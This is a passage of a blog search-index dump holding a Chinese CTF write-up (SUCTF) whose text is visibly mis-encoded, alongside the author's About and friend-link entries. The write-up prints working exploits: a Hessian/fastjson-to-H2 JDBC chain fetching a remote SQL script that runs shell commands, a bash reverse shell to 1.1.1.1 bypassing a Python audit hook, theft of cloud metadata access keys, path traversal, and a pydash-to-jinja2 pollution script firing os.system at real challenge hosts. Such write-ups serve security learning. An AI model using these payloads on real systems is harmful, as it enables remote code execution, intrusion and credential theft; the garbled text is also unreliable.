\u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; 